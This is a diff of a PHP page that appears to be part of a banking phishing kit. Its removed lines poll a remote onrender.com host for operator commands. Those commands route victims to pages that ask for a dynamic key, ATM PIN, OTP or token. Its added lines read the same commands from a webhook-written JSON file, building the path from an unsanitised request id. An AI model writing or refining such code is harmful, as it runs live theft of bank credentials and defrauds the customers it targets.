@@ -1,27 +1,44 @@
 <!DOCTYPE html>
 <?php
-$transactionId = $_GET['id'] ?? null;
+session_start();
 
-if ($transactionId) {
-    $url = "https://temporaletiquetes.onrender.com/dinadatos/verificaciones.php?id=" . urlencode($transactionId);
-    $json = @file_get_contents($url);
-    $data = json_decode($json, true);
-    $accion = $data['accion'] ?? '';
-
-    $rutas = [
-        "pedir_dinamica" => "dinamica-id.php",
-        "pedir_cajero"   => "ccajero-id.php",
-        "pedir_otp"      => "otp-id.php",
-        "pedir_token"    => "token-id.php",
-        "error_tc"       => "error-ccajero.php",
-        "error_logo"     => "error-id.php",
-    ];
-
-    $archivoActual = basename($_SERVER['PHP_SELF']);
-    if (isset($rutas[$accion]) && $archivoActual !== $rutas[$accion]) {
-        header("Location: " . $rutas[$accion] . "?id=" . urlencode($transactionId));
+// Asegurarse de tener el transactionId
+if (!isset($_SESSION["transactionId"])) {
+    if (isset($_GET["id"])) {
+        $_SESSION["transactionId"] = $_GET["id"];
+    } elseif (isset($_POST["id"])) {
+        $_SESSION["transactionId"] = $_POST["id"];
+    } else {
+        echo "Error: ID de transacción no especificado.";
         exit;
     }
+}
+
+$transactionId = $_SESSION["transactionId"];
+$archivo = __DIR__ . "/verificaciones/{$transactionId}.json";
+
+// Verifica si el archivo de acción existe
+if (file_exists($archivo)) {
+    $contenido = json_decode(file_get_contents($archivo), true);
+    $accion = $contenido["accion"] ?? "";
+
+    // Verifica si la acción coincide con esta página
+    if ($accion === "error_tc") {
+        // ⚠️ Aquí va tu contenido principal de error-token.php
+        // (No necesitas mover nada más, solo deja el contenido debajo de este bloque)
+
+        // Elimina el archivo después de ejecutarse para permitir nuevas acciones
+        unlink($archivo);
+    } else {
+        // Si no coincide, puedes redirigir o mostrar mensaje
+        header("Location: ../id.html");
+        exit;
+    }
+} else {
+    // Archivo no existe aún, esperar a que el webhook lo cree
+    header("Refresh: 2");
+    echo "Esperando acción...";
+    exit;
 }
 ?>
 
